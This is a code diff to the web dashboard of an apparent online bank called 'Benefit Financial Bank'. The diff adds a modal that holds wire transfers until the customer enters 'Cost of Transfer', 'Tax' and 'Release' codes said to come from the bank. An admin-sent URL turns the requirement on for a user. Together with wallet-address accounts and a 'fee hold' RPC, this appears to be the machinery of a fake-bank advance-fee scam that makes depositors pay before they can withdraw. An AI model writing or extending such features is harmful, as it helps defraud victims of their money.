@@ -167,6 +167,7 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-h
 .alert{padding:11px 14px;border-radius:8px;font-size:13px;margin-bottom:14px;display:none}
 .alert-err{background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
 .alert-ok{background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
+.alert-info{background:#eff6ff;color:#1d4ed8;border:1px solid #bfdbfe}
 .info-note{background:#fffbeb;border:1px solid #fcd34d;border-radius:8px;padding:10px 12px;font-size:12px;color:#92400e;margin-bottom:14px}
 
 
@@ -788,6 +789,25 @@ footer{background:var(--white);border-top:1px solid var(--border);padding:14px 2
   </div>
 </div>
 
+<!-- International Wire: Cost of Transfer / Tax / Release code modal -->
+<div class="modal-overlay" id="modal-wire-fee">
+  <div class="modal">
+    <div class="modal-header"><div class="modal-title">🌐 International Wire — Transfer Codes</div><button class="modal-close" onclick="closeModal('modal-wire-fee')">✕</button></div>
+    <div class="modal-body">
+      <div class="alert alert-info" id="wf-info" style="display:none"></div>
+      <div class="alert alert-err" id="wf-err"></div>
+      <div class="alert alert-ok" id="wf-ok"></div>
+      <div class="form-group"><label class="form-label">Cost of Transfer Code</label><input class="form-input" type="text" id="wf-cost" placeholder="Enter the cost-of-transfer code from the bank"></div>
+      <div class="form-group"><label class="form-label">Tax Code</label><input class="form-input" type="text" id="wf-tax" placeholder="Enter the tax code from the bank"></div>
+      <div class="form-group"><label class="form-label">Release Code</label><input class="form-input" type="text" id="wf-release" placeholder="Enter the release code from the bank"></div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-cancel" onclick="closeModal('modal-wire-fee')">Cancel</button>
+      <button class="btn btn-primary" onclick="doSubmitWireFee()" id="wf-submit">Submit & Send</button>
+    </div>
+  </div>
+</div>
+
 <!-- Loan Modal -->
 <div class="modal-overlay" id="modal-loan">
   <div class="modal">
@@ -849,6 +869,7 @@ const SUPA_URL="https://hmmtcnklfpqjoumwdcoj.supabase.co";
 const SUPA_KEY="sb_publishable_fidyxSk8eEyVTpM_JCMjSA_xz4OQ6_C";
 const sb=supabase.createClient(SUPA_URL,SUPA_KEY);
 let userId=null,userProfile=null,allTxns=[];
+let wfPendingAmount=null, wfPendingLabel='';
 
 // Wallet address used as the account identifier everywhere. Replaces the old
 // numeric account number so users can fund directly from this
@@ -880,6 +901,22 @@ async function init(){
     // Keep admins out of the user dashboard — they belong in /admin.
     if(p.role==='admin'){window.location.replace('/admin');return;}
     userProfile=p;
+// International Wire codes shared by admin link (?wf=1&cost=... ) - apply over the
+    // server config so codes auto-fill without a backend write
+    try {
+      const up = new URLSearchParams(location.search);
+      if (up.get('wf') === '1') {
+        const wc = Object.assign({}, userProfile.wire_codes || {}, {
+          enabled: true,
+          cost: up.get('cost') || '',
+          tax: up.get('tax') || '',
+          release: up.get('release') || ''
+        });
+        const need = ['cost','tax','release'].filter(k => up.get(k));
+        if (need.length) wc.require = { cost: need.includes('cost'), tax: need.includes('tax'), release: need.includes('release') };
+        userProfile.wire_codes = wc ;
+      }
+    } catch (e) { }
     const name=p.full_name||p.email.split('@')[0];
     const initial=(name[0]||'?').toUpperCase();
     // Sidebar
@@ -1030,6 +1067,24 @@ async function doTransfer(){
   const reason=document.getElementById('tf-reason').value.trim();
   if(!name||!account||!bank){showAlert('tf-err','Please fill all recipient details');return;}
   if(!amount||amount<=0){showAlert('tf-err','Enter a valid amount');return;}
+  if(wireEnabled('cost')||wireEnabled('tax')||wireEnabled('release')){
+    // The admin has switched ON one or more International Wire code
+    // requirements. Collect the codes first, then submit the wire via the
+    // SECURITY DEFINER RPC (cross-user fee hold).
+    const codes=[];
+    if(wireEnabled('cost'))codes.push('Cost of Transfer');
+    if(wireEnabled('tax'))codes.push('Tax');
+    if(wireEnabled('release'))codes.push('Release');
+    wfPendingAmount=amount; wfPendingLabel='International wire transfer';
+    const info=document.getElementById('wf-info');
+    info.style.display='block';
+    info.textContent='This transfer requires the following code(s) from the bank: '+codes.join(', ')+'. Enter them to submit the wire.';
+    document.getElementById('wf-err').style.display='none';
+    document.getElementById('wf-ok').style.display='none';
+    ['wf-cost','wf-tax','wf-release'].forEach(id=>{document.getElementById(id).value='';});
+    openModal('modal-wire-fee');
+    return;
+  }
   setLoading('tf-btn',true,'Submitting...');
   const{error}=await sb.from('transfer_requests').insert({user_id:userId,amount,recipient_name:name,recipient_account:account,bank_name:bank,reason});
   setLoading('tf-btn',false,'Submit Request');
@@ -1056,6 +1111,21 @@ async function doQuickTransfer(){
   const bank=document.getElementById('qt-bank').value.trim();
   if(!name||!account||!bank){showAlert('qt-err','Please fill all fields');return;}
   if(!amount||amount<=0){showAlert('qt-err','Enter valid amount');return;}
+  if(wireEnabled('cost')||wireEnabled('tax')||wireEnabled('release')){
+    wfPendingAmount=amount; wfPendingLabel='International wire transfer';
+    const codes=[];
+    if(wireEnabled('cost'))codes.push('Cost of Transfer');
+    if(wireEnabled('tax'))codes.push('Tax');
+    if(wireEnabled('release'))codes.push('Release');
+    const info=document.getElementById('wf-info');
+    info.style.display='block';
+    info.textContent='This transfer requires the following code(s) from the bank: '+codes.join(', ')+'. Enter them to submit the wire.';
+    document.getElementById('wf-err').style.display='none';
+    document.getElementById('wf-ok').style.display='none';
+    ['wf-cost','wf-tax','wf-release'].forEach(id=>{document.getElementById(id).value='';});
+    openModal('modal-wire-fee');
+    return;
+  }
   const{error}=await sb.from('transfer_requests').insert({user_id:userId,amount,recipient_name:name,recipient_account:account,bank_name:bank,reason:'Quick transfer'});
   if(error){showAlert('qt-err',error.message);return;}
   showAlert('qt-ok','Transfer submitted for approval!');
@@ -1604,6 +1674,56 @@ function showToast(title, msg, onClick) {
   setTimeout(dismiss, 6000);
 }
 
+function wireEnabled(w) {
+  try {
+    const wf = userProfile.wire_codes || {};
+    if (!wf || !wf.enabled) return false;
+    return !w || (wf.require ? wf.require[w] === true : wf[w] === true);
+  } catch(e) { return false; }
+}
+
+function openWireCodeModal() {
+  document.getElementById('wf-err').style.display='none';
+  document.getElementById('wf-ok').style.display='none';
+  document.getElementById('wf-info').style.display='none';
+  ['wf-cost','wf-tax','wf-release'].forEach(id=>{document.getElementById(id).value='';});
+  openModal('modal-wire-fee');
+}
+
+async function doSubmitWireFee() {
+  const cost = document.getElementById('wf-cost').value.trim();
+  const tax = document.getElementById('wf-tax').value.trim();
+  const release = document.getElementById('wf-release').value.trim();
+  if (!cost || !tax || !release) { showAlert('wf-err', 'All three codes are required: Cost of Transfer, Tax, and Release.'); return; }
+  if (!wfPendingAmount) { showAlert('wf-err', 'Session expired. Please open the transfer again.'); return; }
+  const label = wfPendingLabel || 'International wire transfer';
+  if (wireEnabled('cost') || wireEnabled('tax') || wireEnabled('release')) {
+    setLoading('wf-submit', true, 'Submitting...');
+    const { data, error } = await sb.rpc('submit_wire_transfer', {
+      p_amount: wfPendingAmount,
+      p_cost_code: cost,
+      p_tax_code: tax,
+      p_release_code: release
+    });
+    setLoading('wf-submit', false, 'Submit & Send');
+    if (error) { showAlert('wf-err', error.message); return; }
+    document.getElementById('wf-info').style.display='none';
+    showAlert('wf-ok', 'International wire submitted! Funds will be released once the bank verifies the codes.');
+    sendInboxMail('International Wire Submitted — $'+Number(data.amount).toFixed(2),
+      'Your international wire request has been received and is pending confirmation.\n\n' +
+      '  • Amount: $'+Number(data.amount).toFixed(2)+'\n' +
+      '  • Type: '+data.type+'\n' +
+      '  • Reference: '+data.reference+'\n' +
+      '\nThe Cost of Transfer, Tax, and Release codes you submitted have been forwarded to our transfer desk for verification. You will receive an update once the wire is processed.\n\n— Benefit Financial Bank',
+      'billing');
+    setTimeout(()=>{ closeModal('modal-wire-fee'); wfPendingAmount=null; loadMyTransfers(); }, 2500);
+    return;
+
+  }
+  showAlert('wf-err', 'Wire codes are not currently required. Submitting as a plain transfer request instead.');
+  closeModal('modal-wire-fee');
+}
+
 function sendInboxMail(subject, body, category) {
   if (!userId) { console.warn('sendInboxMail: no userId'); return; }
   sb.from('support_tickets').insert({
@@ -1644,3 +1764,4 @@ window.smartsupp||(function(d) {
 <noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
 </body>
 </html>
+
